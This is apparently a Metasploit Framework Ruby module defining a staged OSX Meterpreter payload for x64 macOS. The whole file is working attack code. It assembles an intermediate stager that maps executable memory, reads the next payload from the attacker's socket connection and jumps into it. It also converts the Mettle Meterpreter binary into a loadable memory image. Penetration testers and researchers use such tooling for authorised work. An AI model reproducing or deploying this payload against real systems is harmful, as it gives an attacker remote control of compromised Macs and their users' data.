##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_x64_osx'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'macho'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'OSX Meterpreter',
        'Description'   => 'Inject the mettle server payload (staged)',
        'Platform'      => 'osx',
        'Arch'          => ARCH_X64,
        'License'       => MSF_LICENSE,
        'Session'       => Msf::Sessions::Meterpreter_x64_OSX,
        'Convention'    => 'sockedi',
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    midstager_asm = %(
      push rdi                    ; save sockfd
      xor rdi, rdi                ; address
      mov rsi, #{payload.length}  ; length
      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov r10, 0x1002             ; MAP_PRIVATE | MAP_ANONYMOUS
      xor r8, r8                  ; fd
      xor r9, r9                  ; offset
      mov eax, 0x20000c5          ; mmap
      syscall

      mov rdx, rsi                ; length
      mov rsi, rax                ; address
      pop rdi                     ; sockfd
      mov r10, 0x40               ; MSG_WAITALL
      xor r8, r8                  ; srcaddr
      xor r9, r9                  ; addrlen
      mov eax, 0x200001d          ; recvfrom
      syscall

      mov rax, #{@entry_offset}
      add rsi, rax
      jmp rsi
    )

    midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string
    print_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
    conn.put(midstager) == midstager.length
  end

  def generate_stage(opts = {})
    data = MetasploitPayloads::Mettle.new('x86_64-apple-darwin', 
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :exec
 
    #data = File.binread("/Users/user/dev/git/darwin-stager/main_osx")
    #data = File.binread("/Users/user/dev/git/ios/shellcc/shellcode/shelltest64")
    #data = File.binread("/usr/bin/yes")
    macho = MachO::MachOFile.new_from_bin(data)
    main_func = macho[:LC_MAIN].first
    @entry_offset = main_func.entryoff

    output_data = ''
    for segment in macho.segments
      for section in segment.sections
        file_section = segment.fileoff + section.offset
        vm_addr = section.addr - 0x100000000
        section_data = data[file_section, section.size]
        if output_data.size < vm_addr
          output_data += "\x00" * (vm_addr - output_data.size)
        end
        if section_data
          output_data[vm_addr, output_data.size] = section_data
        end
      end
    end

    output_data += "\x00" * (0x1000 - (output_data.size % 0x1000))
    output_data
  end
end
